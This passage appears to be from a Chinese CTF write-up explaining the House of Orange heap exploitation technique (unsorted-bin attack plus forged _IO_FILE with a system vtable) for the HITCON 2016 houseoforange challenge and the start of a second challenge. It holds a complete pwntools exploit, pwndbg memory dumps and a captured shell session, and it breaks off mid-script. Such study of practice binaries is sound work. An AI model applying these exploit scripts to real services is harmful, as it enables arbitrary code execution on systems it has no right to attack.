<li><p>unsortbin attack，修改_IO_list_all为&amp;main_arena，在unsortedbin取链时，会在bk+0x10的位置写上&amp;main_arena</p>
</li>
<li><p>再次malloc的时候，由于unsortedbin异常，故会打印错误，调用如下链：</p>
<p><code>**libc_malloc =&gt; malloc_printerr =&gt;** libc_message =&gt; abort =&gt; _IO_flush_all_lockp</code></p>
<p>由于main_arena那个是错误的io file，会顺着_chain找下一个，也就是我们伪造的io file，从而调用system，get shell</p>
</li>
</ol>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">_IO_list_all = libcbase + libc.sym[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x400</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+ p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_file = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all - <span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += fake_file</span><br><span class="line">payload += p64(heapbase + <span class="number">0x5c8</span>)</span><br><span class="line">payload += p64(system) * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x800</span>,payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556ffb0c0</span><br><span class="line">Size: 0x411</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556ffb4d0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin)</span><br><span class="line">Addr: 0x555556ffb4f0</span><br><span class="line">Size: 0x60</span><br><span class="line">fd: 0x00</span><br><span class="line">bk: 0x7fee3bd3b510</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x555556ffb4f0</span><br><span class="line">0x555556ffb4f0:	0x0068732f6e69622f	0x0000000000000060</span><br><span class="line">0x555556ffb500:	0x0000000000000000	0x00007fee3bd3b510</span><br><span class="line">0x555556ffb510:	0x0000000000000000	0x0000000000000001</span><br><span class="line">0x555556ffb520:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb540:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb550:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb560:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb570:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb580:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb590:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb5a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb5b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb5c0:	0x0000000000000000	0x0000555556ffb5c8</span><br><span class="line">0x555556ffb5d0:	0x00007fee3b9de570	0x00007fee3b9de570</span><br><span class="line">0x555556ffb5e0:	0x00007fee3b9de570	0x00007fee3b9de570</span><br><span class="line">0x555556ffb5f0:	0x00007fee3b9de570	0x00007fee3b9de570</span><br><span class="line">0x555556ffb600:	0x00007fee3b9de570	0x00007fee3b9de570</span><br><span class="line">0x555556ffb610:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb620:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p*((struct _IO_FILE_plus*)0x555556ffb4f0)-&gt;vtable</span><br><span class="line">$2 &#x3D; &#123;</span><br><span class="line">  __dummy &#x3D; 93825020179912, </span><br><span class="line">  __dummy2 &#x3D; 140661179147632, </span><br><span class="line">  __finish &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __overflow &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __underflow &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __uflow &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __pbackfail &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __xsputn &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __xsgetn &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __seekoff &#x3D; 0x0, </span><br><span class="line">  __seekpos &#x3D; 0x0, </span><br><span class="line">  __setbuf &#x3D; 0x0, </span><br><span class="line">  __sync &#x3D; 0x0, </span><br><span class="line">  __doallocate &#x3D; 0x0, </span><br><span class="line">  __read &#x3D; 0x0, </span><br><span class="line">  __write &#x3D; 0x0, </span><br><span class="line">  __seek &#x3D; 0x0, </span><br><span class="line">  __close &#x3D; 0x0, </span><br><span class="line">  __stat &#x3D; 0x0, </span><br><span class="line">  __showmanyc &#x3D; 0x0, </span><br><span class="line">  __imbue &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p*((struct _IO_FILE_plus*)0x555556ffb4f0)-&gt;vtable.__overflow</span><br><span class="line">$1 &#x3D; &#123;int (_IO_FILE *, int)&#125; 0x7fee3b9de570 &lt;__libc_system&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007fee3bd3b510</span><br><span class="line">0x7fee3bd3b510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fee3bd3b520 &lt;__GI__IO_list_all&gt;:	0x00007fee3bd3b540	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="6-malloc报错"><a href="#6-malloc报错" class="headerlink" title="6.malloc报错"></a>6.malloc报错</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007faf3a0b7510</span><br><span class="line">0x7faf3a0b7510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7faf3a0b7520 &lt;__GI__IO_list_all&gt;:	0x00007faf3a0b6b78	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;  p _IO_list_all</span><br><span class="line">$1 &#x3D; (struct _IO_FILE_plus *) 0x7faf3a0b6b78 &lt;main_arena+88&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007faf3a0b6b78 + 0x60</span><br><span class="line">0x7faf3a0b6bd8 &lt;main_arena+184&gt;:	0x0000555556b754f0	0x0000555556b754f0</span><br><span class="line">0x7faf3a0b6be8 &lt;main_arena+200&gt;:	0x00007faf3a0b6bd8	0x00007faf3a0b6bd8</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x0000555556b754f0</span><br><span class="line">0x555556b754f0:	0x0068732f6e69622f	0x0000000000000060</span><br><span class="line">0x555556b75500:	0x00007faf3a0b6bc8	0x00007faf3a0b6bc8</span><br><span class="line">0x555556b75510:	0x0000000000000000	0x0000000000000001</span><br><span class="line">0x555556b75520:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75540:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75550:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75560:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75570:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75580:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75590:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b755a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b755b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b755c0:	0x0000000000000000	0x0000555556b755c8</span><br><span class="line">0x555556b755d0:	0x00007faf39d5a570	0x00007faf39d5a570</span><br></pre></td></tr></table></figure>

<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">'debug'</span>,arch=<span class="string">'amd64'</span>)</span><br><span class="line">file =<span class="string">'houseoforange_hitcon_2016'</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"><span class="comment">#local libc</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(<span class="string">"./"</span>+file)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug libc</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  p = process([<span class="string">"/usr/local/glibc-2.23/lib/ld-2.23.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">      env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span>:</span><br><span class="line">  p = process(<span class="string">"./houseoforange_hitcon_2016"</span>,</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/home/winter/buu/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">  p.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">  p.sendline(str(choice))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name,price=<span class="number">1</span>,color=<span class="number">1</span>)</span>:</span></span><br><span class="line">  cmd(<span class="number">1</span>)</span><br><span class="line">  p.recvuntil(<span class="string">"name :"</span>)</span><br><span class="line">  p.sendline(str(size))</span><br><span class="line">  p.recvuntil(<span class="string">"Name :"</span>)</span><br><span class="line">  p.send(name)</span><br><span class="line">  p.recvuntil(<span class="string">"Price of Orange"</span>)</span><br><span class="line">  p.sendline(str(price))</span><br><span class="line">  p.recvuntil(<span class="string">"Color of Orange"</span>)</span><br><span class="line">  p.sendline(str(color))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">  cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(size,name,price=<span class="number">1</span>,color=<span class="number">0xddaa</span>)</span>:</span></span><br><span class="line">  cmd(<span class="number">3</span>)</span><br><span class="line">  p.recvuntil(<span class="string">"name :"</span>)</span><br><span class="line">  p.sendline(str(size))</span><br><span class="line">  p.recvuntil(<span class="string">"Name:"</span>)</span><br><span class="line">  p.send(name)</span><br><span class="line">  p.recvuntil(<span class="string">"Orange:"</span>)</span><br><span class="line">  p.sendline(str(price))</span><br><span class="line">  p.recvuntil(<span class="string">"Orange"</span>)</span><br><span class="line">  p.sendline(str(color))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x18</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p32(<span class="number">1</span>)+p32(<span class="number">0x1f</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(len(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">'a'</span>)</span><br><span class="line">show()</span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  log.success(<span class="string">"0:"</span>+hex(local))</span><br><span class="line">  libc_base = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  log.success(<span class="string">"1:"</span>+hex(local))</span><br><span class="line">  libcbase = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)<span class="number">-0x39c161</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  log.success(<span class="string">"2:"</span>+hex(local))</span><br><span class="line">  libc_base = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>) - <span class="number">0x3bba61</span></span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libcbase))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span></span><br><span class="line">edit(len(payload),payload)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">heapbase = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) - <span class="number">0xc0</span></span><br><span class="line">log.success(<span class="string">"heap_base:"</span>+hex(heapbase))</span><br><span class="line"></span><br><span class="line">_IO_list_all = libcbase + libc.sym[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x400</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+ p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_file = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all - <span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += fake_file</span><br><span class="line">payload += p64(heapbase + <span class="number">0x5c8</span>)</span><br><span class="line">payload += p64(system) * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x800</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>1/2概率</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line">@          House of Orange          @</span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line"> 1. Build the house                  </span><br><span class="line"> 2. See the house                    </span><br><span class="line"> 3. Upgrade the house                </span><br><span class="line"> 4. Give up                          </span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line">Your choice : *** Error in &#96;.&#x2F;houseoforange_hitcon_2016&#39;: malloc(): memory corruption: 0x00007fdf7644b520 ***</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line">@          House of Orange          @</span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line"> 1. Build the house                  </span><br><span class="line"> 2. See the house                    </span><br><span class="line"> 3. Upgrade the house                </span><br><span class="line"> 4. Give up                          </span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line">Your choice : *** Error in &#96;.&#x2F;houseoforange_hitcon_2016&#39;: malloc(): memory corruption: 0x00007f37d5976520 ***</span><br><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &#39;ls\n&#39;</span><br><span class="line">[DEBUG] Received 0x6e bytes:</span><br><span class="line">    &#39;core\tgets\thouseoforange_hitcon_2016  magic.py   orange.py\n&#39;</span><br><span class="line">    &#39;exp.py\thoo.py\tlibc-2.23.so\t\t   magicheap  winter.py\n&#39;</span><br><span class="line">core    gets    houseoforange_hitcon_2016  magic.py   orange.py</span><br><span class="line">exp.py    hoo.py    libc-2.23.so           magicheap  winter.py</span><br></pre></td></tr></table></figure>

<h3 id="参考-amp-下载"><a href="#参考-amp-下载" class="headerlink" title="参考 &amp; 下载"></a>参考 &amp; 下载</h3><p><a href="houseoforange_hitcon_2016">附件</a></p>
<ul>
<li><a href="https://www.anquanke.com/post/id/218887#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/218887#h3-4</a></li>
<li><a href="https://blog.joe1sn.top/2021/BUUCTF/#0x3-%E6%B3%84%E9%9C%B2libc%E5%92%8Cheap%E7%9A%84%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">https://blog.joe1sn.top/2021/BUUCTF/#0x3-%E6%B3%84%E9%9C%B2libc%E5%92%8Cheap%E7%9A%84%E5%9C%B0%E5%9D%80</a></li>
<li><a href="http://blog.eonew.cn/archives/1093#glibc-227" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1093#glibc-227</a></li>
<li><a href="https://www.xi4oyu.top/6a6ded9c/" target="_blank" rel="noopener">https://www.xi4oyu.top/6a6ded9c/</a></li>
<li><a href="https://roderickchan.github.io/2021/04/24/houseoforange-hitcon-2016/" target="_blank" rel="noopener">https://roderickchan.github.io/2021/04/24/houseoforange-hitcon-2016/</a></li>
<li><a href="https://blog.csdn.net/weixin_44145820/article/details/105270036" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44145820/article/details/105270036</a></li>
<li><a href="https://orangegzy.github.io/2020/08/18/houseoforange-hitcon-2016-FSOP/" target="_blank" rel="noopener">https://orangegzy.github.io/2020/08/18/houseoforange-hitcon-2016-FSOP/</a></li>
</ul>
<h2 id="纵横杯2020-wind-farm-panel"><a href="#纵横杯2020-wind-farm-panel" class="headerlink" title="纵横杯2020 - wind_farm_panel"></a>纵横杯2020 - wind_farm_panel</h2><blockquote>
<p>house of orange的经典题，没啥变化，，，有了上一个基础，很快能做出来</p>
</blockquote>
<h3 id="程序流程-1"><a href="#程序流程-1" class="headerlink" title="程序流程"></a>程序流程</h3><p><img src="/2021/05/13/house-of-orange/image-20201229182916014.png" alt="image-20201229182916014"></p>
<p>根据菜单，只有添加、打印和修改功能，没有free功能</p>
<p><img src="/2021/05/13/house-of-orange/image-20201229183505395.png" alt="image-20201229183505395"></p>
<p><img src="/2021/05/13/house-of-orange/image-20201229183037804.png" alt="image-20201229183037804"></p>
<p>而且添加和修改的时候都有堆溢出，故应该用house of orange来解。</p>
<h3 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">file = <span class="string">"wind_farm_panel"</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"><span class="comment">#local libc</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(<span class="string">"./"</span>+file)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug libc</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  p = process([<span class="string">"/usr/local/glibc-2.23/lib/ld-2.23.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span>:</span><br><span class="line">  p = process([<span class="string">"/home/winter/hoo/ld-2.23.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/home/winter/hoo/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    